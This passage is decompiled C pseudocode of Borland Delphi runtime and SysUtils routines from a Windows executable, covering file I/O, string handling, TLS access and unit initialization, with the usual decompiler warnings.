  int v6; // eax
  DWORD v7; // eax
  DWORD v8; // edx
  DWORD v9; // ecx
  int v10; // edi
  int v11; // edi
  _DWORD *result; // eax
  int v13; // eax

  if ( *(_DWORD *)(a1 + 4) != 55216 )
  {
    if ( (unsigned int)(*(_DWORD *)(a1 + 4) - 55216) > 3 )
    {
      v13 = 102;
      return sub_40267C(v13);
    }
    v6 = (*(int (**)(void))(a1 + 36))();
    if ( v6 )
      sub_40267C(v6);
  }
  *(_DWORD *)(a1 + 4) = 55219;
  *(_DWORD *)(a1 + 8) = a2;
  *(_DWORD *)(a1 + 36) = sub_40512E;
  *(_DWORD *)(a1 + 28) = sub_4050B7;
  if ( *(_BYTE *)(a1 + 72) )
  {
    v7 = -1073741824;
    v8 = *(int *)((char *)&dword_4050ED + ((unsigned __int8)(byte_41E042 & 0x70) >> 2));
    v9 = 2;
    v10 = a3 - 3;
    if ( v10 )
    {
      v9 = 3;
      v11 = v10 + 1;
      if ( v11 )
      {
        v7 = 0x40000000;
        *(_DWORD *)(a1 + 4) = 55218;
        if ( v11 != -1 )
        {
          v7 = 0x80000000;
          *(_DWORD *)(a1 + 4) = 55217;
        }
      }
    }
    result = CreateFileA((LPCSTR)(a1 + 72), v7, v8, 0, v9, 0x80u, 0);
  }
  else
  {
    *(_DWORD *)(a1 + 36) = sub_4050B7;
    if ( a3 == 3 )
      result = GetStdHandle(0xFFFFFFF5);
    else
      result = GetStdHandle(0xFFFFFFF6);
  }
  if ( result != (_DWORD *)-1 )
  {
    *(_DWORD *)a1 = result;
    return result;
  }
  *(_DWORD *)(a1 + 4) = 55216;
  v13 = GetLastError();
  return sub_40267C(v13);
}
// 4050ED: using guessed type int dword_4050ED;
// 41E042: using guessed type char byte_41E042;

//----- (004050B7) --------------------------------------------------------
int sub_4050B7()
{
  return 0;
}

//----- (0040510D) --------------------------------------------------------
_DWORD *__usercall sub_40510D@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ecx

  v2 = (unsigned __int8)byte_41E042;
  LOBYTE(v2) = byte_41E042 & 3;
  if ( (byte_41E042 & 3) == 3 )
    LOBYTE(v2) = 2;
  return sub_40500C(a1, a2, v2);
}
// 41E042: using guessed type char byte_41E042;

//----- (00405124) --------------------------------------------------------
_DWORD *__usercall sub_405124@<eax>(int a1@<eax>, int a2@<edx>)
{
  return sub_40500C(a1, a2, 3);
}

//----- (0040512E) --------------------------------------------------------
_DWORD *__usercall sub_40512E@<eax>(int a1@<eax>)
{
  int v1; // eax
  _DWORD *result; // eax
  void *v3; // [esp-4h] [ebp-4h]

  v3 = *(void **)a1;
  *(_DWORD *)(a1 + 4) = 55216;
  result = (_DWORD *)(CloseHandle(v3) - 1);
  if ( result )
  {
    v1 = GetLastError();
    result = sub_40267C(v1);
  }
  return result;
}

//----- (00405144) --------------------------------------------------------
_DWORD *__usercall WRITEBYTES@<eax>(_DWORD *result@<eax>, char *a2@<edx>, signed int a3@<ecx>)
{
  char *v4; // edi
  signed int v5; // edx
  int v6; // eax
  _DWORD *v7; // [esp-Ch] [ebp-14h]
  signed int v8; // [esp-8h] [ebp-10h]
  _DWORD *v9; // [esp-4h] [ebp-Ch]
  signed int v10; // [esp-4h] [ebp-Ch]

  if ( result[1] != 55218 )
  {
    if ( result != dword_41E214 )
      return sub_40267C(105);
    v10 = a3;
    v7 = result;
    sub_404FFE((int)result);
    result = v7;
    a3 = v10;
    if ( v7[1] != 55218 )
      return sub_40267C(105);
  }
  while ( 1 )
  {
    v4 = (char *)(result[3] + result[5]);
    v5 = result[2] - result[3];
    if ( v5 > a3 )
    {
      result[3] += a3;
      qmemcpy(v4, a2, a3);
      return result;
    }
    result[3] = result[2];
    qmemcpy(v4, a2, v5);
    a2 += v5;
    v6 = ((int (__cdecl *)(int, _DWORD *))result[7])(a3 - v5, result);
    if ( v6 )
      break;
    a3 = v8;
    result = v9;
  }
  sub_40267C(v6);
  return v9;
}
// 405173: variable 'v8' is possibly undefined
// 405174: variable 'v9' is possibly undefined

//----- (004051AF) --------------------------------------------------------
_DWORD *__usercall WRITESPACES@<eax>(_DWORD *result@<eax>, signed int a2@<edx>)
{
  signed int v3; // [esp-8h] [ebp-8h]
  _DWORD *v4; // [esp-4h] [ebp-4h]

  while ( a2 > 64 )
  {
    v4 = result;
    v3 = a2 - 64;
    WRITEBYTES(result, asc_41C060, 64);
    if ( *((_DWORD *)__linkproc__ GetTls() + 1) )
      return v4;
    a2 = v3;
    result = v4;
  }
  if ( a2 > 0 )
    result = WRITEBYTES(result, asc_41C060, a2);
  return result;
}

//----- (0040520F) --------------------------------------------------------
int __usercall sub_40520F@<eax>(_DWORD *a1@<eax>)
{
  int v1; // edx
  int result; // eax

  result = (int)WRITEBYTES(a1, asc_41C0A0, 2);
  v1 = *(_DWORD *)(result + 4);
  if ( v1 == 55218 )
  {
    result = (*(int (**)(void))(result + 32))();
    if ( !result )
      return result;
    return (int)sub_40267C(result);
  }
  if ( v1 != 55217 )
  {
    result = 103;
    return (int)sub_40267C(result);
  }
  return result;
}

//----- (0040528C) --------------------------------------------------------
_DWORD *__usercall System::__linkproc__ Write0CString@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  unsigned int v3; // kr04_4

  v3 = strlen(a2) + 1;
  WRITESPACES(a1, 1 - v3);
  return WRITEBYTES(a1, a2, v3 - 1);
}

//----- (004052BC) --------------------------------------------------------
int __usercall System::__linkproc__ Pow10@<eax>(int result@<eax>)
{
  if ( result < 0 )
  {
    result = -result;
    if ( result >= 5120 )
    {
      __asm { fldz }
    }
    else
    {
      _EDX = 5 * (result & 0x1F);
      __asm
      {
        fld     tbyte_405360[edx*2]
        fdivp   st(1), st
      }
      result = (unsigned int)result >> 5;
      if ( result )
      {
        if ( (result & 0xF) != 0 )
        {
          _EDX = 5 * (result & 0xF);
          __asm
          {
            fld     tbyte_405496[edx*2]
            fdivp   st(1), st
          }
        }
        result = (unsigned int)result >> 4;
        if ( result )
        {
          result *= 5;
          __asm
          {
            fld     tbyte_40552C[eax*2]
            fdivp   st(1), st
          }
        }
      }
    }
  }
  else if ( result )
  {
    if ( result >= 5120 )
    {
      __asm { fld     tbyte_405356 }
    }
    else
    {
      _EDX = 5 * (result & 0x1F);
      __asm
      {
        fld     tbyte_405360[edx*2]
        fmulp   st(1), st
      }
      result = (unsigned int)result >> 5;
      if ( result )
      {
        if ( (result & 0xF) != 0 )
        {
          _EDX = 5 * (result & 0xF);
          __asm
          {
            fld     tbyte_405496[edx*2]
            fmulp   st(1), st
          }
        }
        result = (unsigned int)result >> 4;
        if ( result )
        {
          result *= 5;
          __asm
          {
            fld     tbyte_40552C[eax*2]
            fmulp   st(1), st
          }
        }
      }
    }
  }
  return result;
}
// 4052D5: inconsistent fpu stack

//----- (00405590) --------------------------------------------------------
int __userpurge System::__linkproc__ _llmul@<eax>(int a1@<eax>, int a2, int a3)
{
  return a2 * a1;
}

//----- (00405818) --------------------------------------------------------
int __cdecl System::Finalization()
{
  VARIANTARG *v0; // ecx
  VARIANTARG *v1; // ecx
  VARIANTARG *v2; // ecx
  int result; // eax
  unsigned int v4[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v4[2] = (unsigned int)&savedregs;
  v4[1] = (unsigned int)&loc_405876;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  if ( !++dword_41E424 )
  {
    CLOSE((int)dword_41E048);
    CLOSE((int)dword_41E214);
    System::_16448();
    sub_4043B8((VARIANTARG *)&word_41E40C, v0);
    sub_4043B8(&stru_41E3FC, v1);
    sub_4043B8(&stru_41E3EC, v2);
  }
  result = 0;
  __writefsdword(0, v4[0]);
  return result;
}
// 40584F: variable 'v0' is possibly undefined
// 405859: variable 'v1' is possibly undefined
// 405863: variable 'v2' is possibly undefined
// 41E40C: using guessed type __int16 word_41E40C;
// 41E424: using guessed type int dword_41E424;

//----- (00405880) --------------------------------------------------------
int __cdecl System::initialization()
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_405968;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( dword_41E424-- == 0 )
  {
    dword_41E030 = 0;
    dword_41E038 = 0;
    dword_41E03C = 0;
    byte_41E042 = 2;
    byte_41E043 = 2;
    byte_41E044 = 3;
    stru_41E3EC.vt = 0;
    stru_41E3FC.vt = 1;
    word_41E40C = 10;
    dword_41E414 = -2147352572;
    dword_41E3E0 = (int (__thiscall *)(_DWORD))&loc_404028;
    dword_41E3E4 = (int (__stdcall *)(_DWORD))sub_404020;
    dword_41E3E8 = (int (*)(void))&loc_404028;
    if ( (unsigned __int8)System::_16736() )
      System::_16541();
    sub_402B4C();
    System::__linkproc__ Assign(dword_41E048, (char *)&dword_405974);
    System::__linkproc__ Assign(dword_41E214, (char *)&dword_405974);
    dword_41E02C = (int)GetCommandLineA();
    dword_41E028 = System::_16453();
    dword_41E020 = GetCurrentThreadId();
  }
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 405974: using guessed type int dword_405974;
// 41E020: using guessed type int dword_41E020;
// 41E028: using guessed type int dword_41E028;
// 41E02C: using guessed type int dword_41E02C;
// 41E030: using guessed type int dword_41E030;
// 41E038: using guessed type int dword_41E038;
// 41E03C: using guessed type int dword_41E03C;
// 41E042: using guessed type char byte_41E042;
// 41E043: using guessed type char byte_41E043;
// 41E044: using guessed type char byte_41E044;
// 41E3E0: using guessed type int (__thiscall *dword_41E3E0)(_DWORD);
// 41E3E4: using guessed type int (__stdcall *dword_41E3E4)(_DWORD);
// 41E3E8: using guessed type int (*dword_41E3E8)(void);
// 41E40C: using guessed type __int16 word_41E40C;
// 41E414: using guessed type int dword_41E414;
// 41E424: using guessed type int dword_41E424;

//----- (004059A0) --------------------------------------------------------
BOOL sub_4059A0()
{
  HLOCAL v0; // eax
  int v1; // ebx
  BOOL result; // eax

  if ( (TlsIndex & 0x80000000) != 0 )
    sub_4034BC(226);
  v0 = LocalAlloc_0(0x40u, 0xCu);
  v1 = (int)v0;
  if ( !v0 )
    sub_4034BC(226);
  result = TlsSetValue(TlsIndex, v0);
  dword_41E4DC = v1;
  return result;
}
// 41E4DC: using guessed type int dword_41E4DC;

//----- (004059F0) --------------------------------------------------------
LPVOID __linkproc__ GetTls()
{
  LPVOID result; // eax

  if ( !byte_41E4C8 )
    return (LPVOID)*((_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + TlsIndex);
  result = TlsGetValue(TlsIndex);
  if ( !result )
  {
    sub_4059A0();
    result = TlsGetValue(TlsIndex);
    if ( !result )
      result = (LPVOID)dword_41E4DC;
  }
  return result;
}
// 41E4C8: using guessed type char byte_41E4C8;
// 41E4DC: using guessed type int dword_41E4DC;

//----- (00405A34) --------------------------------------------------------
_DWORD *SysInit::_16393()
{
  CHAR Filename[268]; // [esp+0h] [ebp-10Ch] BYREF

  GetModuleFileNameA_0(hInst, Filename, 0x105u);
  dword_41C0B4 = (int)System::LoadResourceModule(Filename);
  if ( !dword_41C0B4 )
    dword_41C0B4 = dword_41C0A8;
  return sub_404B00(&dword_41C0A4);
}
// 41C0A8: using guessed type int dword_41C0A8;
// 41C0B4: using guessed type int dword_41C0B4;

//----- (00405A80) --------------------------------------------------------
int __usercall __linkproc__ InitExe@<eax>(int a1@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebp>)
{
  hInst = GetModuleHandleA_0(0);
  *(&dword_41C0A4 + 1) = hInst;
  *(&dword_41C0A4 + 2) = 0;
  *(&dword_41C0A4 + 3) = 0;
  SysInit::_16393();
  return __linkproc__ StartExe(a1, (int)&dword_41C0A4, a2);
}

//----- (00405AB4) --------------------------------------------------------
int Finalization_0_7()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_405AD9;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E4D8;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E4D8: using guessed type int dword_41E4D8;

//----- (00405AE4) --------------------------------------------------------
void sub_405AE4()
{
  --dword_41E4D8;
}
// 41E4D8: using guessed type int dword_41E4D8;

//----- (00405E7C) --------------------------------------------------------
LPVOID __usercall sub_405E7C@<eax>(UINT a1@<eax>, SIZE_T a2@<edx>)
{
  HGLOBAL v2; // eax

  v2 = GlobalAlloc(a1, a2);
  return GlobalLock(v2);
}

//----- (00405E8C) --------------------------------------------------------
LPVOID __usercall sub_405E8C@<eax>(UINT uFlags@<ecx>, SIZE_T dwBytes@<edx>, const void *a3@<eax>)
{
  HGLOBAL v3; // eax
  HGLOBAL v5; // [esp-Ch] [ebp-Ch]

  v5 = GlobalHandle(a3);
  GlobalUnlock(v5);
  v3 = GlobalReAlloc(v5, dwBytes, uFlags);
  return GlobalLock(v3);
}

//----- (00405EA8) --------------------------------------------------------
HGLOBAL __usercall sub_405EA8@<eax>(const void *a1@<eax>)
{
  HGLOBAL v2; // [esp-4h] [ebp-4h]

  v2 = GlobalHandle(a1);
  GlobalUnlock(v2);
  return GlobalFree(v2);
}

//----- (00405EBC) --------------------------------------------------------
int Finalization_0_7_0()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_405EE1;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E4E0;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E4E0: using guessed type int dword_41E4E0;

//----- (00405EEC) --------------------------------------------------------
void sub_405EEC()
{
  --dword_41E4E0;
}
// 41E4E0: using guessed type int dword_41E4E0;

//----- (0040618C) --------------------------------------------------------
int Finalization_0_7_1()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_4061B1;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E4E4;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E4E4: using guessed type int dword_41E4E4;

//----- (004061BC) --------------------------------------------------------
void sub_4061BC()
{
  --dword_41E4E4;
}
// 41E4E4: using guessed type int dword_41E4E4;

//----- (00406CA0) --------------------------------------------------------
unsigned int __userpurge sub_406CA0@<eax>(unsigned int result@<eax>, unsigned __int16 a2@<dx>, _WORD *a3@<ecx>, _WORD *a4)
{
  unsigned int v4; // ett

  v4 = result;
  LOWORD(result) = result / a2;
  *a3 = result;
  *a4 = v4 % a2;
  return result;
}

//----- (00406CBC) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __fastcall sub_406CBC(int a1, void *a2)
{
  DWORD v2; // [esp-10h] [ebp-14h]
  DWORD v3; // [esp-Ch] [ebp-10h]
  DWORD v4; // [esp-8h] [ebp-Ch]
  const ULONG_PTR *v5; // [esp-4h] [ebp-8h]

  LOBYTE(a2) = 1;
  Exception_Create(dword_406844, a2);
  sub_402F98(v2, v3, v4, v5);
}
// 406CD3: positive sp value 10 has been found
// 406CCD: variable 'v2' is possibly undefined
// 406CCD: variable 'v3' is possibly undefined
// 406CCD: variable 'v4' is possibly undefined
// 406CCD: variable 'v5' is possibly undefined
// 406844: using guessed type int dword_406844[4];

//----- (00406CD4) --------------------------------------------------------
void __usercall SysUtils::_16482(int a1@<eax>)
{
  void *v1; // edx
  LStr *v2; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v3; // [esp-18h] [ebp-1Ch] BYREF
  DWORD v4; // [esp-14h] [ebp-18h]
  int *v5; // [esp-10h] [ebp-14h]
  const ULONG_PTR *v6; // [esp-Ch] [ebp-10h]
  unsigned int v7; // [esp-8h] [ebp-Ch]
  BYTE *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v5 = &savedregs;
  v4 = (DWORD)&loc_406D26;
  v3 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v3);
  System::LoadResString(a1, &v8);
  LOBYTE(v1) = 1;
  Exception_CreateFmt(dword_406844, v1, v8);
  sub_402F98((DWORD)v3, v4, (DWORD)v5, v6);
  v2 = (LStr *)v8;
  __writefsdword(0, v7);
  v8 = (BYTE *)&loc_406D2D;
  System::__linkproc__ LStrClr(v2);
}
// 406D06: variable 'v1' is possibly undefined
// 406844: using guessed type int dword_406844[4];

//----- (00406D34) --------------------------------------------------------
char *__usercall sub_406D34@<eax>(int a1@<eax>)
{
  char *v2; // esi

  v2 = (char *)sub_402598(a1);
  sub_4028D4(v2, a1, 0);
  return v2;
}

//----- (00406D54) --------------------------------------------------------
int __usercall Sysutils::UpperCase@<eax>(int a1@<eax>, BYTE **a2@<edx>)
{
  int v5; // ebx
  LStr *v6; // ecx
  int result; // eax
  _BYTE *v8; // edx
  BYTE *i; // esi

  v5 = sub_403724(a1);
  System::__linkproc__ LStrSetLength(a2, v5, v6);
  v8 = (_BYTE *)a1;
  for ( i = *a2; v5; --v5 )
  {
    LOBYTE(result) = *v8;
    if ( *v8 >= 0x61u && (unsigned __int8)result <= 0x7Au )
      LOBYTE(result) = result - 32;
    *i = result;
    ++v8;
    ++i;
  }
  return result;
}
// 406D68: variable 'v6' is possibly undefined

//----- (00406D90) --------------------------------------------------------
int __usercall Sysutils::LowerCase@<eax>(int a1@<eax>, BYTE **a2@<edx>)
{
  int v5; // ebx
  LStr *v6; // ecx
  int result; // eax
  _BYTE *v8; // edx
  BYTE *i; // esi

  v5 = sub_403724(a1);
  System::__linkproc__ LStrSetLength(a2, v5, v6);
  v8 = (_BYTE *)a1;
  for ( i = *a2; v5; --v5 )
  {
    LOBYTE(result) = *v8;
    if ( *v8 >= 0x41u && (unsigned __int8)result <= 0x5Au )
      LOBYTE(result) = result + 32;
    *i = result;
    ++v8;
    ++i;
  }
  return result;
}
// 406DA4: variable 'v6' is possibly undefined

//----- (00406DCC) --------------------------------------------------------
int __usercall sub_406DCC@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, unsigned int a3@<ecx>)
{
  int result; // eax
  int v6; // edx
  bool v7; // zf
  unsigned int v8; // ecx

  result = 0;
  v6 = a3 & 3;
  v8 = a3 >> 2;
  v7 = v8 == 0;
  do
  {
    if ( !v8 )
      break;
    v7 = *a1++ == *a2++;
    --v8;
  }
  while ( v7 );
  if ( v7 && !memcmp(a1, a2, v6) )
    result = 1;
  return result;
}

//----- (00406DEC) --------------------------------------------------------
// Borland Visual Component Library & Packages
int __usercall Sysutils::CompareText@<eax>(_BYTE *a1@<eax>, _BYTE *a2@<edx>)
{
  _BYTE *v2; // esi
  _BYTE *v3; // edi
  _BYTE *v4; // ecx
  bool v5; // zf
  unsigned __int8 v6; // bl
  unsigned __int8 v7; // bh

  v2 = a1;
  v3 = a2;
  if ( a1 )
    a1 = (_BYTE *)*((_DWORD *)a1 - 1);
  if ( a2 )
    a2 = (_BYTE *)*((_DWORD *)a2 - 1);
  v4 = a1;
  if ( a1 > a2 )
    v4 = a2;
  v5 = 1;
  while ( 1 )
  {
    do
    {
      if ( !v4 )
        break;
      v5 = *v2++ == *v3++;
      --v4;
    }
    while ( v5 );
    if ( v5 )
      break;
    v6 = *(v2 - 1);
    if ( v6 >= 0x61u && v6 <= 0x7Au )
      v6 -= 32;
    v7 = *(v3 - 1);
    if ( v7 >= 0x61u && v7 <= 0x7Au )
      v7 -= 32;
    v5 = v6 == v7;
    if ( v6 != v7 )
    {
      a1 = (_BYTE *)v6;
      a2 = (_BYTE *)v7;
      return a1 - a2;
    }
  }
  return a1 - a2;
}

//----- (00406E40) --------------------------------------------------------
// Borland Visual Component Library & Packages
// BDS 2005-2007 and Delphi6-7 Visual Component Library
char __usercall Sysutils::SameText@<al>(_BYTE *a1@<eax>, _BYTE *a2@<edx>)
{
  if ( a1 == a2 )
    goto LABEL_6;
  if ( a1 )
  {
    if ( a2 && *((_DWORD *)a1 - 1) == *((_DWORD *)a2 - 1) && !Sysutils::CompareText(a1, a2) )
    {
LABEL_6:
      LOBYTE(a1) = 1;
      return (char)a1;
    }
    LOBYTE(a1) = 0;
  }
  return (char)a1;
}

//----- (00406E64) --------------------------------------------------------
// BDS 2005-2007 and Delphi6-7 Visual Component Library
int __usercall DumbItDownFor95@<eax>(char *a1@<eax>, char *a2@<edx>)
{
  char *v4; // eax
  int v6; // [esp-Ch] [ebp-14h]
  char *v7; // [esp-8h] [ebp-10h]
  int v8; // [esp-4h] [ebp-Ch]

  v8 = sub_403724((int)a2);
  v7 = sub_4038E8(a2);
  v6 = sub_403724((int)a1);
  v4 = sub_4038E8(a1);
  return CompareStringA(0x400u, 1u, v4, v6, v7, v8) - 2;
}

//----- (00406E9C) --------------------------------------------------------
void __usercall Sysutils::Trim(char *a1@<eax>, char **a2@<edx>)
{
  int v5; // eax
  LStr *v6; // ecx
  int v7; // esi
  int i; // ebx

  v5 = sub_403724((int)a1);
  v7 = v5;
  for ( i = 1; v5 >= i && (unsigned __int8)a1[i - 1] <= 0x20u; ++i )
    ;
  if ( v5 >= i )
  {
    while ( (unsigned __int8)a1[v7 - 1] <= 0x20u )
      --v7;
    __linkproc__ LStrCopy(a1, i, v7 - i + 1, a2);
  }
  else
  {
    System::__linkproc__ LStrClr(v6);
  }
}
// 406EC6: variable 'v6' is possibly undefined

//----- (00406EEC) --------------------------------------------------------
void __usercall Sysutils::TrimRight(char *a1@<eax>, char **a2@<edx>)
{
  int i; // ebx

  for ( i = sub_403724((int)a1); i > 0 && (unsigned __int8)a1[i - 1] <= 0x20u; --i )
    ;
  __linkproc__ LStrCopy(a1, 1, i, a2);
}

//----- (00406F20) --------------------------------------------------------
int __usercall Sysutils::AdjustLineBreaks@<eax>(int a1@<eax>, BYTE **a2@<edx>)
{
  char *v3; // ebp
  unsigned __int8 *v4; // ebx
  int v5; // eax
  unsigned __int8 *v6; // esi
  int i; // edi
  int result; // eax
  BYTE *v9; // ebx
  BYTE *v10; // edi
  _BYTE *v11; // edi
  _BYTE *v12; // edi

  v3 = (char *)a1;
  v4 = (unsigned __int8 *)a1;
  v5 = sub_403724(a1);
  v6 = &v4[v5];
  for ( i = 0; v6 > v4; ++v4 )
  {
    if ( *v4 == 10 )
    {
      ++i;
    }
    else if ( *v4 == 13 )
    {
      if ( v4[1] == 10 )
        ++v4;
      else
        ++i;
    }
    else if ( _bittest(dword_41C104, *v4) )
    {
      ++v4;
    }
  }
  if ( i )
  {
    v9 = (BYTE *)v3;
    __linkproc__ LStrFromPCharLen(a2, 0, i + v6 - (unsigned __int8 *)v3);
    v10 = *a2;
    if ( v6 > (unsigned __int8 *)v3 )
    {
      do
      {
        LOBYTE(result) = *v9;
        if ( *v9 == 10 )
        {
          *v10 = 13;
          v11 = v10 + 1;
          *v11 = 10;
          v10 = v11 + 1;
          ++v9;
        }
        else if ( *v9 == 13 )
        {
          *v10 = 13;
          v12 = v10 + 1;
          *v12 = 10;
          v10 = v12 + 1;
          if ( *++v9 == 10 )
            ++v9;
        }
        else
        {
          if ( _bittest(dword_41C104, (unsigned __int8)result) )
          {
            *v10++ = result;
            ++v9;
          }
          LOBYTE(result) = *v9;
          *v10++ = *v9++;
        }
      }
      while ( v6 > v9 );
    }
  }
  else
  {
    __linkproc__ LStrAsg((char **)a2, v3);
  }
  return result;
}

//----- (00406FEC) --------------------------------------------------------
int __fastcall Sysutils::IntToStr(int a2, LStr *a1)
{
  int v2; // eax
  int result; // eax
  int v4; // [esp+0h] [ebp-8h] BYREF
  char v5; // [esp+4h] [ebp-4h]

  v4 = v2;
  v5 = 0;
  FmtStr((BYTE **)a1, (unsigned __int8 *)&dword_407018, (int)&v4, 0);
  return result;
}
// 406FF1: variable 'v2' is possibly undefined
// 407018: using guessed type int dword_407018;

//----- (0040701C) --------------------------------------------------------
void __usercall Sysutils::IntToHex(int a1@<ecx>, int a2@<edx>, int a3@<eax>)
{
  int v3; // [esp+0h] [ebp-10h] BYREF
  char v4; // [esp+4h] [ebp-Ch]
  int v5; // [esp+8h] [ebp-8h]
  char v6; // [esp+Ch] [ebp-4h]

  v3 = a2;
  v4 = 0;
  v5 = a3;
  v6 = 0;
  FmtStr((BYTE **)a1, "%.*x", (int)&v3, 1);
}

//----- (00407058) --------------------------------------------------------
int __usercall sub_407058@<eax>(int a1@<eax>, int a2@<edx>, char *a3@<ecx>)
{
  int result; // eax
  char *v5; // [esp+0h] [ebp-8h] BYREF

  v5 = a3;
  result = System::__linkproc__ ValLong(a1, &v5);
  if ( v5 )
    result = a2;
  return result;
}

//----- (00407070) --------------------------------------------------------
HANDLE __usercall FileOpen@<eax>(char *a1@<eax>, char a2@<dl>)
{
  char *v2; // eax
  DWORD v4; // [esp-18h] [ebp-20h]
  DWORD v5; // [esp-14h] [ebp-1Ch]

  v5 = *(&dwShareMode + ((unsigned __int8)(a2 & 0xF0) >> 4));
  v4 = dwDesiredAccess[a2 & 3];
  v2 = sub_4038E8(a1);
  return CreateFileA_0(v2, v4, v5, 0, 3u, 0x80u, 0);
}

//----- (004070B0) --------------------------------------------------------
HANDLE __usercall Sysutils::FileCreate@<eax>(char *a1@<eax>)
{
  char *v2; // eax

  v2 = sub_4038E8(a1);
  return CreateFileA_0(v2, 0xC0000000, 0, 0, 2u, 0x80u, 0);
}

//----- (004070D4) --------------------------------------------------------
DWORD __usercall FileRead@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>)
{
  DWORD NumberOfBytesRead; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesRead = nNumberOfBytesToRead;
  if ( !ReadFile_0(a3, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    NumberOfBytesRead = -1;
  return NumberOfBytesRead;
}

//----- (00407100) --------------------------------------------------------
DWORD __usercall FileRead_0@<eax>(DWORD nNumberOfBytesToRead@<ecx>, LPVOID lpBuffer@<edx>, void *a3@<eax>)
{
  DWORD NumberOfBytesWritten; // [esp+0h] [ebp-10h] BYREF

  NumberOfBytesWritten = nNumberOfBytesToRead;
  if ( !WriteFile_0(a3, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesWritten, 0) )
    NumberOfBytesWritten = -1;
  return NumberOfBytesWritten;
}

//----- (0040712C) --------------------------------------------------------
DWORD __usercall sub_40712C@<eax>(DWORD dwMoveMethod@<ecx>, LONG lDistanceToMove@<edx>, void *a3@<eax>)
{
  return SetFilePointer_0(a3, lDistanceToMove, 0, dwMoveMethod);
}

//----- (00407138) --------------------------------------------------------
BOOL __usercall sub_407138@<eax>(void *a1@<eax>)
{
  return CloseHandle_0(a1);
}

//----- (00407140) --------------------------------------------------------
int __usercall Sysutils::FileAge@<eax>(char *a1@<eax>)
{
  char *v2; // eax
  HANDLE v3; // eax
  struct _WIN32_FIND_DATAA FindFileData; // [esp+4h] [ebp-14Ch] BYREF
  struct _FILETIME LocalFileTime; // [esp+144h] [ebp-Ch] BYREF
  WORD FatDate[2]; // [esp+14Ch] [ebp-4h] BYREF

  v2 = sub_4038E8(a1);
  v3 = FindFirstFileA_0(v2, &FindFileData);
  if ( v3 == (HANDLE)-1
    || (FindClose_0(v3), (FindFileData.dwFileAttributes & 0x10) != 0)
    || (FileTimeToLocalFileTime(&FindFileData.ftLastWriteTime, &LocalFileTime),
        !FileTimeToDosDateTime(&LocalFileTime, &FatDate[1], FatDate)) )
  {
    *(_DWORD *)FatDate = -1;
  }
  return *(_DWORD *)FatDate;
}

//----- (004071A8) --------------------------------------------------------
bool __usercall sub_4071A8@<al>(char *a1@<eax>)
{
  return Sysutils::FileAge(a1) != -1;
}

//----- (004071B8) --------------------------------------------------------
DWORD __usercall Sysutils::FileSetAttr@<eax>(DWORD a1@<edx>, char *a2@<eax>)
{
  DWORD v3; // ebx
  char *v4; // eax

  v3 = 0;
  v4 = sub_4038E8(a2);
  if ( !SetFileAttributesA(v4, a1) )
    v3 = GetLastError_0();
  return v3;
}

//----- (004071E0) --------------------------------------------------------
DWORD __usercall SysUtils::_16594@<eax>(int a1@<eax>)
{
  FILETIME FileTime; // [esp+0h] [ebp-Ch] BYREF

  while ( (*(_DWORD *)(a1 + 16) & *(_DWORD *)(a1 + 24)) != 0 )
  {
    if ( !FindNextFileA(*(HANDLE *)(a1 + 20), (LPWIN32_FIND_DATAA)(a1 + 24)) )
      return GetLastError_0();
  }
  FileTimeToLocalFileTime((const FILETIME *)(a1 + 44), &FileTime);
  FileTimeToDosDateTime(&FileTime, (LPWORD)(a1 + 2), (LPWORD)a1);
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a1 + 56);
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a1 + 24);
  sub_4036F8((BYTE **)(a1 + 12), (BYTE *)(a1 + 68), 260);
  return 0;
}

//----- (00407244) --------------------------------------------------------
DWORD __usercall Sysutils::FindFirst@<eax>(char *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  char *v4; // eax
  HANDLE v5; // eax
  DWORD v6; // esi
